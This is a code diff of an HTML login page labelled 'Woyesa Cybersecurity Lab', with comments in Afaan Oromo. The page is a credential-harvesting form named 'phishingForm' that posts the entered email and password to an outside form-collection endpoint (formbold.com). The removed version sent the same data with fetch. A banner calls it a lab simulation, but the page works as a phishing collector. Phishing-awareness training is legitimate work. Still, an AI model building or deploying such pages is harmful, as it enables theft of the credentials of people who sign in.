@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="or">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,20 +14,28 @@
             height: 100vh;
             margin: 0;
         }
-        .login-box {
-            background: white;
+        .login-container {
+            background-color: #ffffff;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
-            width: 350px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+        h2 {
             text-align: center;
+            color: #333;
+            margin-bottom: 20px;
         }
-        h2 { color: #333; margin-bottom: 20px; }
-        .input-group {
+        .form-group {
             margin-bottom: 15px;
-            text-align: left;
         }
-        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+        }
         input[type="email"], input[type="password"] {
             width: 100%;
             padding: 10px;
@@ -39,81 +47,80 @@
             width: 100%;
             padding: 10px;
             background-color: #007bff;
-            color: white;
             border: none;
-            border-radius: 4px;
+            color: white;
             font-size: 16px;
+            border-radius: 4px;
             cursor: pointer;
         }
-        button:hover { background-color: #0056b3; }
-        .warning-text {
-            margin-top: 15px;
-            color: red;
-            font-size: 12px;
-            font-weight: bold;
+        button:hover {
+            background-color: #0056b3;
         }
-        .alert-success {
-            display: none;
-            color: #28a745;
-            font-weight: bold;
+        .alert-box {
+            background-color: #ffe6e6;
+            color: #cc0000;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ffcccc;
             margin-top: 15px;
+            display: none;
+            font-size: 14px;
+        }
+        .warning-box {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ffeeba;
+            margin-top: 15px;
+            font-size: 13px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <h2>Woyesa Cybersecurity Lab</h2>
-    <p style="font-size: 14px; color: #555;">Please sign in to continue.</p>
-    
-    <form id="phishing-form">
-        <div class="input-group">
-            <label>Email Address</label>
-            <input type="email" id="email" placeholder="example@gmail.com" required>
+<div class="login-container">
+    <h2><b>Woyesa Cybersecurity Lab</b></h2>
+    <p style="text-align: center; color: #555;"><b>Please sign in to continue.</b></p>
+
+    <!-- FORM INITIALIZATION FOR FORMBOLD -->
+    <!-- Bakka 'YOUR_FORM_ID_HERE' jedhutti ID kee kan FormBold galchi -->
+    <form action="https://formbold.com/s/9kZ2G" method="POST" id="phishingForm">
+        
+        <!-- Email Input -->
+        <div class="form-group">
+            <label for="email"><b>Email Address</b></label>
+            <input type="email" name="email" id="email" required placeholder="example@domain.com">
         </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
+
+        <!-- Password Input -->
+        <div class="form-group">
+            <label for="password"><b>Password</b></label>
+            <input type="password" name="password" id="password" required placeholder="••••••••">
         </div>
-        <button type="submit">Sign In</button>
+
+        <!-- Submit Button -->
+        <button type="submit" id="signInBtn"><b>Sign In</b></button>
     </form>
 
-    <div id="success-msg" class="alert-success">
-        ⚠️ Simulation complete! Data sent to lab environment securely.
+    <!-- ERGAA ALERT DEETAAN ERGAMUU ISAA MIRKANEESSU -->
+    <div id="simulationAlert" class="alert-box">
+        <b>⚠️ Simulation complete! Data sent to lab environment securely.</b>
     </div>
 
-    <div class="warning-text">
-        ⚠️ LAB SIMULATION ONLY: This is a cyber security awareness environment. Do not use real credentials.
+    <!-- AKEEKKACHIISA LABORATOORII ONLY -->
+    <div class="warning-box">
+        <b>⚠️ LAB SIMULATION ONLY: This is a cyber security awareness environment. Do not use real credentials.</b>
     </div>
 </div>
 
 <script>
-document.getElementById('phishing-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    var emailData = document.getElementById('email').value;
-    var passwordData = document.getElementById('password').value;
-    
-    // AJAX fayyadamnee FormBold-f ergaa jirra (Fuulli akka hin dogoggorreef)
-    fetch("https://formbold.com", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: new URLSearchParams({
-            "email": emailData,
-            "password": passwordData
-        })
-    })
-    .then(response => {
-        // Erga dhufee booda unka dhoksina, ergaa milkaa'inaa argisiisna
-        document.getElementById('phishing-form').style.display = 'none';
-        document.getElementById('success-msg').style.display = 'block';
-    })
-    .catch(error => {
-        console.error('Error:', error);
+    // JavaScript FormBold deetaa erguu isaa hordofu
+    document.getElementById('phishingForm').addEventListener('submit', function(event) {
+        // Saanduqa alert dhuunfaan akka mul'atu gochuu
+        document.getElementById('simulationAlert').style.display = 'block';
     });
-});
 </script>
 
 </body>
